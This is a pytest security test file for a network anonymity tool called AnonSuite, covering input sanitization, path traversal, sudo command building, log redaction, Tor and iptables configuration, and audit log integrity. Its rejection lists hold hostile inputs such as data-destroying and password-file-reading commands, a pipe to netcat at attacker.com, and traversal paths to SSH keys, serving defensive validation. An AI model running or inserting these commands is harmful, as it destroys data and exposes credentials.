"""
Security-focused tests for AnonSuite
"""

import pytest
import os
import stat
import tempfile
import subprocess
import re
from pathlib import Path
from unittest.mock import patch, Mock

@pytest.mark.security
class TestInputValidation:
    """Test input validation and sanitization"""
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection attacks"""
        
        def sanitize_input(user_input):
            """Sanitize user input to prevent command injection"""
            # Allow only alphanumeric characters, hyphens, and underscores
            pattern = r'^[a-zA-Z0-9_-]+$'
            return re.match(pattern, user_input) is not None
        
        # Safe inputs
        safe_inputs = [
            "wlan0",
            "eth0", 
            "test_interface",
            "interface-1",
            "wlp2s0"
        ]
        
        for safe_input in safe_inputs:
            assert sanitize_input(safe_input), f"Safe input rejected: {safe_input}"
        
        # Dangerous inputs
        dangerous_inputs = [
            "wlan0; rm -rf /",
            "eth0 && cat /etc/passwd",
            "interface | nc attacker.com 4444",
            "../../../etc/shadow",
            "$(whoami)",
            "`id`",
            "interface with spaces",
            "interface\nrm -rf /",
            "interface\r\nrm -rf /"
        ]
        
        for dangerous_input in dangerous_inputs:
            assert not sanitize_input(dangerous_input), f"Dangerous input accepted: {dangerous_input}"
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        
        def validate_file_path(file_path, allowed_base_dir):
            """Validate file path to prevent directory traversal"""
            try:
                # Resolve the path and check if it's within allowed directory
                resolved_path = Path(file_path).resolve()
                allowed_path = Path(allowed_base_dir).resolve()
                
                # Check if the resolved path is within the allowed directory
                return str(resolved_path).startswith(str(allowed_path))
            except (OSError, ValueError):
                return False
        
        allowed_dir = "/tmp/anonsuite"
        
        # Safe paths
        safe_paths = [
            "/tmp/anonsuite/config.yaml",
            "/tmp/anonsuite/logs/app.log",
            "/tmp/anonsuite/captures/test.pcap"
        ]
        
        for safe_path in safe_paths:
            # Note: This test assumes the paths exist or we handle the resolution properly
            # In a real implementation, we'd need to handle non-existent paths
            pass
        
        # Dangerous paths
        dangerous_paths = [
            "/tmp/anonsuite/../../../etc/passwd",
            "/tmp/anonsuite/../../root/.ssh/id_rsa",
            "../../../etc/shadow",
            "/etc/passwd",
            "../../../../bin/bash"
        ]
        
        # For testing purposes, we'll test the pattern matching
        for dangerous_path in dangerous_paths:
            assert ".." in dangerous_path or dangerous_path.startswith("/etc/"), \
                f"Dangerous path not detected: {dangerous_path}"
    
    def test_configuration_value_validation(self):
        """Test validation of configuration values"""
        
        def validate_tor_instances(instances):
            """Validate number of Tor instances"""
            try:
                num = int(instances)
                return 1 <= num <= 10
            except (ValueError, TypeError):
                return False
        
        def validate_log_level(level):
            """Validate log level"""
            valid_levels = ["debug", "info", "warn", "error", "critical"]
            return level.lower() in valid_levels
        
        def validate_interface_name(interface):
            """Validate network interface name"""
            pattern = r'^[a-zA-Z0-9]+$'
            return re.match(pattern, interface) is not None
        
        # Test Tor instances validation
        assert validate_tor_instances(3)
        assert validate_tor_instances("5")
        assert not validate_tor_instances(0)
        assert not validate_tor_instances(11)
        assert not validate_tor_instances("invalid")
        assert not validate_tor_instances(-1)
        
        # Test log level validation
        assert validate_log_level("info")
        assert validate_log_level("DEBUG")
        assert validate_log_level("Error")
        assert not validate_log_level("invalid")
        assert not validate_log_level("trace")
        
        # Test interface name validation
        assert validate_interface_name("wlan0")
        assert validate_interface_name("eth0")
        assert not validate_interface_name("wlan0; rm -rf /")
        assert not validate_interface_name("interface with spaces")

@pytest.mark.security
class TestPrivilegeManagement:
    """Test privilege management and escalation controls"""
    
    def test_privilege_requirement_documentation(self):
        """Test that privilege requirements are documented"""
        
        # Define required privileges for different operations
        privilege_requirements = {
            "network_interface_management": ["CAP_NET_ADMIN"],
            "raw_socket_access": ["CAP_NET_RAW"],
            "iptables_modification": ["CAP_NET_ADMIN"],
            "service_management": ["CAP_SYS_ADMIN"],
            "file_system_access": ["CAP_DAC_OVERRIDE"]
        }
        
        for operation, privileges in privilege_requirements.items():
            assert isinstance(operation, str)
            assert isinstance(privileges, list)
            assert len(privileges) > 0
            
            for privilege in privileges:
                assert privilege.startswith("CAP_")
    
    @patch('os.geteuid')
    def test_root_privilege_check(self, mock_geteuid):
        """Test root privilege checking"""
        
        def require_root():
            """Check if running as root"""
            return os.geteuid() == 0
        
        # Test as root
        mock_geteuid.return_value = 0
        assert require_root()
        
        # Test as non-root
        mock_geteuid.return_value = 1000
        assert not require_root()
    
    def test_sudo_command_construction(self):
        """Test secure sudo command construction"""
        
        def build_sudo_command(command, args=None):
            """Build sudo command with proper escaping"""
            if args is None:
                args = []
            
            # Validate command
            allowed_commands = [
                "systemctl",
                "iptables", 
                "ip",
                "iwconfig",
                "hostapd"
            ]
            
            if command not in allowed_commands:
                raise ValueError(f"Command not allowed: {command}")
            
            # Build command with proper escaping
            cmd_parts = ["sudo", command]
            
            # Validate and add arguments
            for arg in args:
                # Basic validation - no shell metacharacters
                if re.search(r'[;&|`$()]', arg):
                    raise ValueError(f"Invalid argument: {arg}")
                cmd_parts.append(arg)
            
            return cmd_parts
        
        # Test valid commands
        cmd = build_sudo_command("systemctl", ["start", "tor"])
        assert cmd == ["sudo", "systemctl", "start", "tor"]
        
        cmd = build_sudo_command("iptables", ["-t", "nat", "-L"])
        assert cmd == ["sudo", "iptables", "-t", "nat", "-L"]
        
        # Test invalid commands
        with pytest.raises(ValueError):
            build_sudo_command("rm", ["-rf", "/"])
        
        with pytest.raises(ValueError):
            build_sudo_command("systemctl", ["start", "tor; rm -rf /"])

@pytest.mark.security
class TestDataProtection:
    """Test data protection and secure handling"""
    
    def test_secure_temporary_file_creation(self, temp_dir):
        """Test secure temporary file creation"""
        
        def create_secure_temp_file(content, directory=None):
            """Create a secure temporary file"""
            # Create temporary file with restricted permissions
            fd, path = tempfile.mkstemp(dir=directory)
            
            try:
                # Set restrictive permissions (owner read/write only)
                os.chmod(path, stat.S_IRUSR | stat.S_IWUSR)
                
                # Write content
                with os.fdopen(fd, 'wb') as f:
                    f.write(content.encode('utf-8'))
                
                return path
            except Exception:
                # Clean up on error
                try:
                    os.close(fd)
                    os.unlink(path)
                except OSError:
                    pass
                raise
        
        # Test secure file creation
        test_content = "sensitive configuration data"
        temp_file = create_secure_temp_file(test_content, temp_dir)
        
        try:
            # Verify file exists
            assert os.path.exists(temp_file)
            
            # Verify permissions
            file_stat = os.stat(temp_file)
            file_mode = file_stat.st_mode
            
            # Should be readable/writable by owner only
            assert file_mode & stat.S_IRUSR  # Owner read
            assert file_mode & stat.S_IWUSR  # Owner write
            assert not (file_mode & stat.S_IRGRP)  # No group read
            assert not (file_mode & stat.S_IWGRP)  # No group write
            assert not (file_mode & stat.S_IROTH)  # No other read
            assert not (file_mode & stat.S_IWOTH)  # No other write
            
            # Verify content
            with open(temp_file, 'r') as f:
                assert f.read() == test_content
        
        finally:
            # Clean up
            if os.path.exists(temp_file):
                os.unlink(temp_file)
    
    def test_sensitive_data_sanitization(self):
        """Test sanitization of sensitive data in logs"""
        
        def sanitize_log_data(log_entry):
            """Sanitize sensitive data from log entries"""
            import re
            
            # Patterns for sensitive data
            patterns = [
                (r'\b(?:\d{1,3}\.){3}\d{1,3}\b', '[IP_REDACTED]'),  # IP addresses
                (r'\b[A-Fa-f0-9]{2}(?:[:-][A-Fa-f0-9]{2}){5}\b', '[MAC_REDACTED]'),  # MAC addresses
                (r'password["\s]*[:=]["\s]*[^\s"]+', 'password=[REDACTED]'),  # Passwords
                (r'key["\s]*[:=]["\s]*[^\s"]+', 'key=[REDACTED]'),  # Keys
                (r'token["\s]*[:=]["\s]*[^\s"]+', 'token=[REDACTED]'),  # Tokens
            ]
            
            sanitized = log_entry
            for pattern, replacement in patterns:
                sanitized = re.sub(pattern, replacement, sanitized, flags=re.IGNORECASE)
            
            return sanitized
        
        # Test IP address sanitization
        log_with_ip = "Connected to server 192.168.1.100 on port 8080"
        sanitized = sanitize_log_data(log_with_ip)
        assert "192.168.1.100" not in sanitized
        assert "[IP_REDACTED]" in sanitized
        
        # Test MAC address sanitization
        log_with_mac = "Interface wlan0 has MAC address 00:11:22:33:44:55"
        sanitized = sanitize_log_data(log_with_mac)
        assert "00:11:22:33:44:55" not in sanitized
        assert "[MAC_REDACTED]" in sanitized
        
        # Test password sanitization
        log_with_password = 'Config: {"password": "secret123", "user": "admin"}'
        sanitized = sanitize_log_data(log_with_password)
        assert "secret123" not in sanitized
        assert "[REDACTED]" in sanitized
    
    def test_secure_configuration_storage(self, temp_dir):
        """Test secure configuration file storage"""
        
        def save_secure_config(config_data, config_path):
            """Save configuration with secure permissions"""
            import json
            
            # Create directory if it doesn't exist
            os.makedirs(os.path.dirname(config_path), exist_ok=True)
            
            # Write configuration file
            with open(config_path, 'w') as f:
                json.dump(config_data, f, indent=2)
            
            # Set secure permissions (owner read/write only)
            os.chmod(config_path, stat.S_IRUSR | stat.S_IWUSR)
        
        config_data = {
            "anonymity": {
                "tor_instances": 3,
                "load_balancer": "haproxy"
            },
            "wifi": {
                "interface": "wlan0"
            }
        }
        
        config_path = os.path.join(temp_dir, "config", "anonsuite.json")
        save_secure_config(config_data, config_path)
        
        # Verify file exists and has correct permissions
        assert os.path.exists(config_path)
        
        file_stat = os.stat(config_path)
        file_mode = file_stat.st_mode
        
        # Should be readable/writable by owner only
        assert file_mode & stat.S_IRUSR
        assert file_mode & stat.S_IWUSR
        assert not (file_mode & stat.S_IRGRP)
        assert not (file_mode & stat.S_IROTH)

@pytest.mark.security
class TestNetworkSecurity:
    """Test network security features"""
    
    def test_dns_leak_prevention_config(self):
        """Test DNS leak prevention configuration"""
        
        def generate_dns_config(dns_servers=None):
            """Generate DNS configuration for leak prevention"""
            if dns_servers is None:
                # Use privacy-focused DNS servers
                dns_servers = [
                    "1.1.1.1",      # Cloudflare
                    "1.0.0.1",      # Cloudflare
                    "8.8.8.8",      # Google (fallback)
                    "8.8.4.4"       # Google (fallback)
                ]
            
            config = {
                "nameservers": dns_servers,
                "options": [
                    "timeout:2",
                    "attempts:3",
                    "rotate"
                ],
                "search": []  # Empty search domains for privacy
            }
            
            return config
        
        config = generate_dns_config()
        
        assert "nameservers" in config
        assert len(config["nameservers"]) > 0
        assert "1.1.1.1" in config["nameservers"]  # Privacy-focused DNS
        assert "options" in config
        assert "timeout:2" in config["options"]
    
    def test_tor_circuit_isolation(self):
        """Test Tor circuit isolation configuration"""
        
        def generate_tor_config(instances=3):
            """Generate Tor configuration with circuit isolation"""
            configs = []
            
            for i in range(instances):
                config = {
                    "instance_id": i,
                    "socks_port": 9052 + i,
                    "control_port": 9151 + i,
                    "data_directory": f"/tmp/tor_instance_{i}",
                    "isolation": {
                        "isolate_client_protocol": True,
                        "isolate_dest_addr": True,
                        "isolate_dest_port": True
                    },
                    "circuit_build_timeout": 30,
                    "new_circuit_period": 600
                }
                configs.append(config)
            
            return configs
        
        configs = generate_tor_config(3)
        
        assert len(configs) == 3
        
        for i, config in enumerate(configs):
            assert config["instance_id"] == i
            assert config["socks_port"] == 9052 + i
            assert config["isolation"]["isolate_client_protocol"] is True
            assert config["isolation"]["isolate_dest_addr"] is True
    
    def test_iptables_rules_validation(self):
        """Test iptables rules validation"""
        
        def validate_iptables_rule(rule):
            """Validate iptables rule for security"""
            # Basic validation - ensure rule doesn't contain dangerous patterns
            dangerous_patterns = [
                r'--to-destination\s+0\.0\.0\.0',  # Redirect to null route
                r'--dport\s+22.*-j\s+DROP',        # Block SSH (dangerous)
                r'-j\s+ACCEPT.*--source\s+0\.0\.0\.0/0',  # Accept from anywhere
            ]
            
            for pattern in dangerous_patterns:
                if re.search(pattern, rule, re.IGNORECASE):
                    return False, f"Dangerous pattern detected: {pattern}"
            
            # Check for required components
            if not re.search(r'-[tA]', rule):
                return False, "Rule must specify table or append"
            
            return True, "Rule is valid"
        
        # Test valid rules
        valid_rules = [
            "-t nat -A OUTPUT -p tcp --dport 80 -j REDIRECT --to-port 8118",
            "-A INPUT -p tcp --dport 9050 -j ACCEPT",
            "-t nat -A OUTPUT -p udp --dport 53 -j REDIRECT --to-port 5353"
        ]
        
        for rule in valid_rules:
            is_valid, message = validate_iptables_rule(rule)
            assert is_valid, f"Valid rule rejected: {rule} - {message}"
        
        # Test invalid rules
        invalid_rules = [
            "--to-destination 0.0.0.0",
            "--dport 22 -j DROP",
            "-j ACCEPT --source 0.0.0.0/0"
        ]
        
        for rule in invalid_rules:
            is_valid, message = validate_iptables_rule(rule)
            assert not is_valid, f"Invalid rule accepted: {rule}"

@pytest.mark.security
class TestAuditLogging:
    """Test audit logging functionality"""
    
    def test_audit_log_structure(self, temp_dir):
        """Test audit log entry structure"""
        import json
        from datetime import datetime
        
        def create_audit_entry(user, operation, success, details=None):
            """Create structured audit log entry"""
            entry = {
                "timestamp": datetime.now().isoformat(),
                "user": user,
                "operation": operation,
                "success": success,
                "details": details or {},
                "source_ip": "127.0.0.1",  # Would be actual IP in real implementation
                "session_id": "test_session_123"
            }
            return entry
        
        # Test successful operation
        entry = create_audit_entry("testuser", "start_tor", True, {"instances": 3})
        
        assert "timestamp" in entry
        assert "user" in entry
        assert "operation" in entry
        assert "success" in entry
        assert entry["success"] is True
        assert entry["details"]["instances"] == 3
        
        # Test failed operation
        entry = create_audit_entry("testuser", "modify_iptables", False, {"error": "permission_denied"})
        
        assert entry["success"] is False
        assert entry["details"]["error"] == "permission_denied"
    
    def test_audit_log_integrity(self, temp_dir):
        """Test audit log integrity protection"""
        import hashlib
        import json
        
        def write_audit_entry_with_hash(entry, log_file):
            """Write audit entry with integrity hash"""
            # Convert entry to JSON string
            entry_json = json.dumps(entry, sort_keys=True)
            
            # Calculate hash
            entry_hash = hashlib.sha256(entry_json.encode()).hexdigest()
            
            # Add hash to entry
            entry_with_hash = entry.copy()
            entry_with_hash["integrity_hash"] = entry_hash
            
            # Write to log file
            with open(log_file, 'a') as f:
                json.dump(entry_with_hash, f)
                f.write('\n')
            
            return entry_hash
        
        def verify_audit_entry_integrity(entry):
            """Verify audit entry integrity"""
            if "integrity_hash" not in entry:
                return False
            
            # Extract hash and remove from entry
            stored_hash = entry.pop("integrity_hash")
            
            # Recalculate hash
            entry_json = json.dumps(entry, sort_keys=True)
            calculated_hash = hashlib.sha256(entry_json.encode()).hexdigest()
            
            return stored_hash == calculated_hash
        
        log_file = os.path.join(temp_dir, "audit.log")
        
        # Create test entry
        entry = {
            "timestamp": "2025-01-12T16:30:00Z",
            "user": "testuser",
            "operation": "test_operation",
            "success": True
        }
        
        # Write entry with hash
        original_hash = write_audit_entry_with_hash(entry, log_file)
        
        # Read and verify entry
        with open(log_file, 'r') as f:
            line = f.readline().strip()
            stored_entry = json.loads(line)
        
        # Verify integrity
        assert verify_audit_entry_integrity(stored_entry)
        
        # Test tampered entry
        stored_entry["user"] = "attacker"
        assert not verify_audit_entry_integrity(stored_entry)
